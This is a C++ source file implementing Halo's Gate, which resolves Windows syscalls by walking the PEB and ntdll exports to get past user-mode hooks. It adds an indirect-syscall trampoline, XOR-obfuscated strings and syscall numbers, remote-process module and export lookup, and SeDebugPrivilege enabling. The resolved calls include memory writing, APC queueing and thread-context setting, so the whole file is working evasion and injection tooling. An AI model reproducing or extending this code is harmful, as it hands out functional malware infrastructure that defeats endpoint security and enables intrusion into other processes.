// native_memory.cpp - Halo's Gate resolver + PEB module walk (no GetModuleHandle / disk load)

#include "native_memory.h"
#include "vendor/xor.h"
#include "vendor/api_hidden.h"
#include <cstring>
#include <cstdint>

extern "C"
{
    extern uint32_t g_sys_NtAllocateVirtualMemory;
    extern uint32_t g_sys_NtFreeVirtualMemory;
    extern uint32_t g_sys_NtProtectVirtualMemory;
    extern uint32_t g_sys_NtReadVirtualMemory;
    extern uint32_t g_sys_NtWriteVirtualMemory;
    extern uint32_t g_sys_NtOpenProcess;
    extern uint32_t g_sys_NtOpenThread;
    extern uint32_t g_sys_NtSuspendThread;
    extern uint32_t g_sys_NtResumeThread;
    extern uint32_t g_sys_NtQueueApcThread;
    extern uint32_t g_sys_NtGetContextThread;
    extern uint32_t g_sys_NtSetContextThread;
    extern uint32_t g_sys_NtClose;
    extern uint32_t g_sys_NtQueryInformationProcess;
    extern uint32_t g_sys_NtQueryVirtualMemory;
    extern uint32_t g_sys_NtFlushInstructionCache;
    extern uint32_t g_sys_NtQuerySystemInformation;
    extern uint64_t g_sys_trampoline;
    extern uint32_t g_sys_xor_mask;
}

namespace ds
{

namespace
{

static bool wci_eq_tail(const wchar_t *hay, int hay_len, const wchar_t *needle)
{
    int nlen = 0;
    while (needle[nlen])
        ++nlen;
    if (nlen > hay_len)
        return false;
    const int off = hay_len - nlen;
    for (int i = 0; i < nlen; ++i)
    {
        wchar_t a = hay[off + i];
        wchar_t b = needle[i];
        if (a >= L'A' && a <= L'Z')
            a += 32;
        if (b >= L'A' && b <= L'Z')
            b += 32;
        if (a != b)
            return false;
    }
    return true;
}

static BYTE *peb_walk_modules(const wchar_t *dll_tail)
{
#ifdef _WIN64
    auto peb = (PPEB)__readgsqword(0x60);
#else
    auto peb = (PPEB)__readfsdword(0x30);
#endif
    if (!peb || !peb->Ldr)
        return nullptr;

    auto *head = &peb->Ldr->InMemoryOrderModuleList;
    auto *cur = head->Flink;
    while (cur != head)
    {
        auto *entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer && entry->FullDllName.Length)
        {
            const int len = entry->FullDllName.Length / 2;
            if (wci_eq_tail(entry->FullDllName.Buffer, len, dll_tail))
                return (BYTE *)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return nullptr;
}

static BYTE *get_export(BYTE *base, const char *name)
{
    auto dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return nullptr;
    auto nth = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    if (nth->Signature != IMAGE_NT_SIGNATURE)
        return nullptr;

    DWORD expRVA = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expRVA)
        return nullptr;
    auto exp = (IMAGE_EXPORT_DIRECTORY *)(base + expRVA);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++)
    {
        const char *fn = (const char *)(base + names[i]);
        if (strcmp(fn, name) == 0)
            return base + funcs[ords[i]];
    }
    return nullptr;
}

static bool extract_clean_syscall(BYTE *fn, uint32_t *out_num)
{
    if (!fn)
        return false;
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
    {
        *out_num = *(uint32_t *)(fn + 4);
        return true;
    }
    return false;
}

static bool halo_gate(BYTE *fn, uint32_t *out_num)
{
    for (int i = 1; i <= 500; ++i)
    {
        BYTE *probe = fn + (i * 32);
        if (extract_clean_syscall(probe, out_num))
        {
            *out_num -= (uint32_t)i;
            return true;
        }
    }
    for (int i = 1; i <= 500; ++i)
    {
        BYTE *probe = fn - (i * 32);
        if (extract_clean_syscall(probe, out_num))
        {
            *out_num += (uint32_t)i;
            return true;
        }
    }
    return false;
}

static bool resolve_syscall(BYTE *ntdll, const char *name, uint32_t *out_enc)
{
    BYTE *fn = get_export(ntdll, name);
    if (!fn)
        return false;
    uint32_t num = 0;
    if (!extract_clean_syscall(fn, &num) && !halo_gate(fn, &num))
        return false;
    *out_enc = num ^ g_sys_xor_mask;
    return true;
}

static uint64_t find_ntdll_syscall_ret(BYTE *ntdll)
{
    auto dos = (IMAGE_DOS_HEADER *)ntdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return 0;
    auto nth = (IMAGE_NT_HEADERS64 *)(ntdll + dos->e_lfanew);
    if (nth->Signature != IMAGE_NT_SIGNATURE)
        return 0;

    auto sec = IMAGE_FIRST_SECTION(nth);
    for (int i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++)
    {
        if (memcmp(sec->Name, ".text", 5) != 0)
            continue;
        BYTE *base = ntdll + sec->VirtualAddress;
        DWORD size = sec->Misc.VirtualSize;
        for (DWORD j = 0; j + 3 <= size; ++j)
        {
            if (base[j] == 0x0F && base[j + 1] == 0x05 && base[j + 2] == 0xC3)
                return (uint64_t)(base + j);
        }
        break;
    }
    return 0;
}

} // namespace

uintptr_t GetLocalModuleBase(const wchar_t *dll_name)
{
    return (uintptr_t)peb_walk_modules(dll_name);
}

uintptr_t GetLocalExport(const wchar_t *module_name, const char *func_name)
{
    BYTE *local = peb_walk_modules(module_name);
    if (!local)
        return 0;
    return (uintptr_t)get_export(local, func_name);
}

uintptr_t GetRemoteModuleBaseNt(HANDLE hProc, const wchar_t *dll_name)
{
    struct
    {
        NTSTATUS ExitStatus;
        PVOID PebBaseAddress;
        ULONG_PTR AffinityMask;
        LONG BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;
    } pbi{};
    if (ds_NtQueryInformationProcess(hProc, 0, &pbi, sizeof(pbi), nullptr) < 0 || !pbi.PebBaseAddress)
        return 0;

    PEB peb{};
    if (!ReadProcessMemoryNt(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), nullptr) || !peb.Ldr)
        return 0;

    LIST_ENTRY ldr_head{};
    BYTE *ldr_addr = (BYTE *)peb.Ldr + 0x20;
    if (!ReadProcessMemoryNt(hProc, ldr_addr, &ldr_head, sizeof(ldr_head), nullptr))
        return 0;

    LIST_ENTRY *head_va = (LIST_ENTRY *)ldr_addr;
    LIST_ENTRY cur = ldr_head;
    for (int i = 0; i < 256; ++i)
    {
        BYTE *entry_ptr = (BYTE *)cur.Flink - 0x10;
        if (entry_ptr == (BYTE *)head_va - 0x10)
            break;

        DS_UNICODE_STRING name_us{};
        if (!ReadProcessMemoryNt(hProc, entry_ptr + 0x58, &name_us, sizeof(name_us), nullptr))
            break;

        wchar_t name_buf[MAX_PATH] = {};
        const size_t copy_len = (name_us.Length / 2 < MAX_PATH - 1) ? name_us.Length / 2 : MAX_PATH - 1;
        if (name_us.Buffer && copy_len > 0)
        {
            ReadProcessMemoryNt(hProc, name_us.Buffer, name_buf, copy_len * 2, nullptr);
            name_buf[copy_len] = 0;
        }

        bool match = true;
        for (int k = 0;; ++k)
        {
            wchar_t a = name_buf[k];
            wchar_t b = dll_name[k];
            if (a >= L'A' && a <= L'Z')
                a += 32;
            if (b >= L'A' && b <= L'Z')
                b += 32;
            if (a != b)
            {
                match = false;
                break;
            }
            if (a == 0)
                break;
        }
        if (match)
        {
            uintptr_t base = 0;
            ReadProcessMemoryNt(hProc, entry_ptr + 0x30, &base, sizeof(base), nullptr);
            return base;
        }

        if (!ReadProcessMemoryNt(hProc, cur.Flink, &cur, sizeof(cur), nullptr))
            break;
    }
    return 0;
}

uintptr_t GetRemoteExportNt(HANDLE hProc, const wchar_t *mod, const char *export_name)
{
    const uintptr_t remote_base = GetRemoteModuleBaseNt(hProc, mod);
    if (!remote_base)
        return 0;

    BYTE *local = peb_walk_modules(mod);
    if (!local)
        return 0;

    BYTE *fn = get_export(local, export_name);
    if (!fn)
        return 0;

    const uintptr_t rva = (uintptr_t)fn - (uintptr_t)local;
    return remote_base + rva;
}

bool EnableDebugPrivilege()
{
    HANDLE tok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;
    TOKEN_PRIVILEGES tp{};
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, xorstr_(L"SeDebugPrivilege"), &luid))
    {
        CloseHandle(tok);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    const DWORD err = GetLastError();
    CloseHandle(tok);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

bool Initialize()
{
    static bool inited = false;
    if (inited)
        return true;

    BYTE *ntdll = peb_walk_modules(xorstr_(L"ntdll.dll"));
    if (!ntdll)
        return false;

    g_sys_trampoline = find_ntdll_syscall_ret(ntdll);
    if (!g_sys_trampoline)
        return false;

    LARGE_INTEGER pc{};
    QueryPerformanceCounter(&pc);
    g_sys_xor_mask = (uint32_t)(pc.QuadPart ^ (uintptr_t)&inited);

    bool ok = true;
    ok &= resolve_syscall(ntdll, xorstr_("NtAllocateVirtualMemory"), &g_sys_NtAllocateVirtualMemory);
    ok &= resolve_syscall(ntdll, xorstr_("NtFreeVirtualMemory"), &g_sys_NtFreeVirtualMemory);
    ok &= resolve_syscall(ntdll, xorstr_("NtProtectVirtualMemory"), &g_sys_NtProtectVirtualMemory);
    ok &= resolve_syscall(ntdll, xorstr_("NtReadVirtualMemory"), &g_sys_NtReadVirtualMemory);
    ok &= resolve_syscall(ntdll, xorstr_("NtWriteVirtualMemory"), &g_sys_NtWriteVirtualMemory);
    ok &= resolve_syscall(ntdll, xorstr_("NtOpenProcess"), &g_sys_NtOpenProcess);
    ok &= resolve_syscall(ntdll, xorstr_("NtOpenThread"), &g_sys_NtOpenThread);
    ok &= resolve_syscall(ntdll, xorstr_("NtSuspendThread"), &g_sys_NtSuspendThread);
    ok &= resolve_syscall(ntdll, xorstr_("NtResumeThread"), &g_sys_NtResumeThread);
    ok &= resolve_syscall(ntdll, xorstr_("NtQueueApcThread"), &g_sys_NtQueueApcThread);
    ok &= resolve_syscall(ntdll, xorstr_("NtGetContextThread"), &g_sys_NtGetContextThread);
    ok &= resolve_syscall(ntdll, xorstr_("NtSetContextThread"), &g_sys_NtSetContextThread);
    ok &= resolve_syscall(ntdll, xorstr_("NtClose"), &g_sys_NtClose);
    ok &= resolve_syscall(ntdll, xorstr_("NtQueryInformationProcess"), &g_sys_NtQueryInformationProcess);
    ok &= resolve_syscall(ntdll, xorstr_("NtQueryVirtualMemory"), &g_sys_NtQueryVirtualMemory);
    ok &= resolve_syscall(ntdll, xorstr_("NtFlushInstructionCache"), &g_sys_NtFlushInstructionCache);
    ok &= resolve_syscall(ntdll, xorstr_("NtQuerySystemInformation"), &g_sys_NtQuerySystemInformation);

    inited = ok;
    return ok;
}

} // namespace ds
